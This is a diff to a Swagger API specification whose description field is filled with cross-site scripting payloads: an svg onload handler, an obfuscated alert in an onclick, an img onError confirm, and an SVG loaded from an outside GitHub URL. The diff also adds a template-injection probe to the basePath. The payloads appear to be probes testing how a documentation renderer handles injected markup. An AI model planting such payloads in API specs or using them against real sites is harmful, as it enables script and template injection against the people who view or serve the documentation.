@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math>'>"<svg/x-onload="document.write('test')"><h1 onclick="al%65rt(1)">BU0</h1></math></form><img/src="x" onError="confirm`1`">
+  description: <form><math>'>"<svg src="https://raw.githubusercontent.com/0xc4sper0/T3stApi/refs/heads/main/Api.svg"><h1 onclick="al%65rt(1)">BU0</h1></math></form><img/src="https://raw.githubusercontent.com/0xc4sper0/T3stApi/refs/heads/main/Api.svg" onError="confirm`1`">
 
   version: production
-basePath: /test-c4sper0
+basePath: /test-c4sper0 <%= 7*3 %>
 security:
   - basicAuth: []
 paths:
